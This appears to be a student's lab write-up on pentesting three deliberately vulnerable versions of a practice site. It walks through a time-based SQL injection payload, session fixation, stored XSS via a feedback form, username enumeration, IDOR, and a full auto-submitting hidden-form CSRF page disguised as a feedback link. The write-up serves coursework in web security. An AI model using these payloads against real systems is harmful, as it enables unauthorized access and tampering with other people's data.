# Project 8 - Pentesting Live Targets

Time spent: **5** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

### Vulnerability #1: SQLI
For this attack, login and navigate to a salespersons information. In the URL, replace the id as your SQL injection. In this case, I added `' OR SLEEP(10) = 0 -- '`. This will make the webpage load for 10 seconds when refreshed. In this case, I timed how long the webpage loaded after refreshing, and it took approximately 10 seconds, which indicates the attack was successful.

<img src="https://media.giphy.com/media/2AKMsJjfRDpEq1D7C4/giphy.gif" />

### Vulnerability #2: Session Hijacking/Fixation
Using a tool provided by the site `public/hacktools/change_session_id.php` I was able to obtain and change the session ID for a given session. In Chrome, I logged in, and then copied that session ID. Then I opened an entirely new browser, and used the tool to change my session ID to the same one I got in Chrome. Once the session ID was changed, I was able to click login, and I was immediately logged in without the need for a username or password.

<img src="https://media.giphy.com/media/QJsUDwH1uZTfTOqElo/giphy.gif" />


## Green

### Vulnerability #1: XSS
To perform an XSS attack, naviagate to the contact tab. Within the feedback textbox, input JavaScript code between a `<script>` tag. Then, whenever a logged in user views the page containing the feedback, the script will be run. In my case, there were also other people performing XSS attacks, so my attack is the third (and last) alert.

<img src="https://media.giphy.com/media/NlXIOZzavdVUAjjYpO/giphy.gif" />

### Vulnerability #2: User Enumeration
To determine if a username exists for this site, navigate to the login page. Using a known username `jmonroe99` for testing, when logging in with this (correct username), but incorrect password, the webpage displays **Log in was unsuccessful.** When using an incorrect username, the same message is output, except it is not boldface. This indicates that the server is handling correct usernames and incorrect usernames differently, thus allowing an attacker to determine if a username is valid or not.

<img src="https://media.giphy.com/media/88iGARxsPFPAaKQ4RR/giphy.gif" />


## Red

### Vulnerability #1: IDOR
This attack is quite easy. As a logged in user, navigate to a salesperson page that is private. Take note of the ID in the URL. Then logout, and navigate to salespeople as a non-logged in user. Edit the ID in the URL to the private salesperson ID, and you will be able to see private information.

<img src="https://media.giphy.com/media/1zjRzUvUm4gTs9eaw4/giphy.gif" />


### Vulnerability #2: CSRF
First, create an html document that contains a hidden form like this:

``<html>
  <head>
    <title>Nothing to see here</title>
  </head>
  <body onload="document.malScript.submit()">
      <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">Feedback</a>
	<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=12" method="post" style="display: none;" name='malScript' target="res">
	    <input type="text" name="first_name" value="wrednA" />
      	<input type="text" name="last_name" value="tteurT" />
      	<input type="text" name="phone" value="0987-654-321" />
      	<input type="text" name="email" value="howdidyoufallforthat@silly.net" />
	</form>
  </body>
</html>``

An attacker can submit feedback with a link to this page, and any logged in user that clicks it will unknowingly change data.
*Note: In my walkthrough, I use a file path to this HTML document. It does not need to be a file path, just any link that opens this document will perform the attack.*

<img src="https://media.giphy.com/media/3NwXtUGJhmrfez8co8/giphy.gif" />


## Notes

Describe any challenges encountered while doing the work
